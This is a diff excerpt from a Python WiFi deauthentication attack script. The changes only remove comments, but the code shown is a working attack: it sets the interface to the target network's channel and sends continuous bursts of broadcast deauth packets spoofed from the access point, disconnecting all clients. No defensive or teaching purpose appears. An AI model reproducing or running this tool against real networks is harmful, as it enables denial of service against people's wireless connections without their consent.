@@ -168,10 +168,9 @@ def choose_network():
 
 def deauth_attack(network):
     global stop_attack
-    target_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast to all devices
+    target_mac = "FF:FF:FF:FF:FF:FF" 
     gateway_mac = network['bssid']
     
-    # Set the channel to the target network's channel
     try:
         subprocess.run(["iwconfig", iface, "channel", str(network['channel'])], check=True)
     except subprocess.CalledProcessError:
@@ -185,10 +184,10 @@ def deauth_attack(network):
     
     try:
         while not stop_attack:
-            for i in range(64):  # Send more deauth packets in each burst
+            for i in range(64): 
                 sendp(packet, iface=iface, count=1, inter=0.002, verbose=False)
             print(f"Sent deauth burst to {network['essid']}")
-            time.sleep(0.5)  # Shorter pause between bursts
+            time.sleep(0.5) 
     except KeyboardInterrupt:
         print("\nAttack stopped by user.")
     finally:
@@ -211,7 +210,7 @@ def main():
         print("Failed to set up interface. Exiting.")
         return
 
-    time.sleep(2)  # Short pause to ensure interface mode change
+    time.sleep(2) 
     scan_networks()
     if not networks:
         print("No networks found. Please check your wireless card and try again.")
